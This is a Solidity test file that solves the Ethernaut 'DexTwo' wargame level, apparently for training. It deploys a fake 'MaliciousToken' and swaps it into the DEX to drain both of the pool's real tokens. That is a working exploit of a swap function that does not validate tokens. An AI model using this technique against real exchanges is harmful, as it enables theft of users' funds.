// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/vm.sol";
import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/DexTwo/DexTwoFactory.sol";
import "../src/levels/DexTwo/MaliciousToken.sol";

contract DexTwoTest is DSTest {
    Vm private constant vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    DexTwoFactory dexTwoFactory;
    address eoa = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
    }

    function testIsDexTwoCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo dexTwo = DexTwo(instance);

        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        MaliciousToken maliciousToken = new MaliciousToken(
            "MalToken",
            "MAL",
            400
        );

        maliciousToken.transfer(instance, 100);
        maliciousToken.approve(instance, 300);

        dexTwo.swap(address(maliciousToken), token1, 100);
        dexTwo.swap(address(maliciousToken), token2, 200);

        assertTrue(ethernaut.submitLevelInstance(payable(instance)));
        vm.stopPrank();
    }
}
